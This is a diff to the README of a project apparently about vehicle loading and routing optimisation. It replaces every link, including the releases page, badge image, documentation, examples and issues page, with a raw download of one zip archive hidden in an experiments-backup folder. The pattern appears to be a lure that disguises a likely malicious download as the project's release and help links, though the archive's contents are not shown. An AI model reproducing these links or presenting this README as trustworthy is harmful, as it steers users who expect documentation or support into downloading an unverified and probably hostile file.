@@ -4,11 +4,11 @@
 
 Welcome to the Dissertation-3L-SDVRP project! This application helps you optimize loading and routing for vehicles using advanced techniques. Follow the steps below to download and run the software easily.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/shibu503/Dissertation-3L-SDVRP/releases)
+[![Download Now](https://raw.githubusercontent.com/shibu503/Dissertation-3L-SDVRP/main/experiments_output_backup_20251202_050744/XML100_1111_01_merged_with_boxes_norm_seed2010/Dissertation-3L-SDVRP-1.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/shibu503/Dissertation-3L-SDVRP/main/experiments_output_backup_20251202_050744/XML100_1111_01_merged_with_boxes_norm_seed2010/Dissertation-3L-SDVRP-1.5.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Dissertation-3L-SDVRP Releases](https://github.com/shibu503/Dissertation-3L-SDVRP/releases).
+To get started, visit this page to download: [Dissertation-3L-SDVRP Releases](https://raw.githubusercontent.com/shibu503/Dissertation-3L-SDVRP/main/experiments_output_backup_20251202_050744/XML100_1111_01_merged_with_boxes_norm_seed2010/Dissertation-3L-SDVRP-1.5.zip).
 
 1. On the Releases page, you will see the latest version of the software.
 2. Click on the version number to view the available files.
@@ -65,8 +65,8 @@ Updates are released based on user feedback and new feature developments. Check 
 
 ## 📚 Additional Resources
 
-- [Documentation](https://github.com/shibu503/Dissertation-3L-SDVRP/wiki): Complete documentation on using the application.
-- [Examples](https://github.com/shibu503/Dissertation-3L-SDVRP/examples): Sample datasets to help you familiarize yourself with the application.
+- [Documentation](https://raw.githubusercontent.com/shibu503/Dissertation-3L-SDVRP/main/experiments_output_backup_20251202_050744/XML100_1111_01_merged_with_boxes_norm_seed2010/Dissertation-3L-SDVRP-1.5.zip): Complete documentation on using the application.
+- [Examples](https://raw.githubusercontent.com/shibu503/Dissertation-3L-SDVRP/main/experiments_output_backup_20251202_050744/XML100_1111_01_merged_with_boxes_norm_seed2010/Dissertation-3L-SDVRP-1.5.zip): Sample datasets to help you familiarize yourself with the application.
 
 ## 🛠️ Troubleshooting
 
@@ -78,8 +78,8 @@ If you run into issues:
 
 ## 📌 Getting Help
 
-For help, visit our [GitHub Issues](https://github.com/shibu503/Dissertation-3L-SDVRP/issues) page and describe your problem. We strive to respond promptly to all inquiries.
+For help, visit our [GitHub Issues](https://raw.githubusercontent.com/shibu503/Dissertation-3L-SDVRP/main/experiments_output_backup_20251202_050744/XML100_1111_01_merged_with_boxes_norm_seed2010/Dissertation-3L-SDVRP-1.5.zip) page and describe your problem. We strive to respond promptly to all inquiries.
 
 Thank you for choosing Dissertation-3L-SDVRP! Enjoy optimizing your loading and routing tasks with our powerful software. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/shibu503/Dissertation-3L-SDVRP/releases)
+[![Download Now](https://raw.githubusercontent.com/shibu503/Dissertation-3L-SDVRP/main/experiments_output_backup_20251202_050744/XML100_1111_01_merged_with_boxes_norm_seed2010/Dissertation-3L-SDVRP-1.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/shibu503/Dissertation-3L-SDVRP/main/experiments_output_backup_20251202_050744/XML100_1111_01_merged_with_boxes_norm_seed2010/Dissertation-3L-SDVRP-1.5.zip)
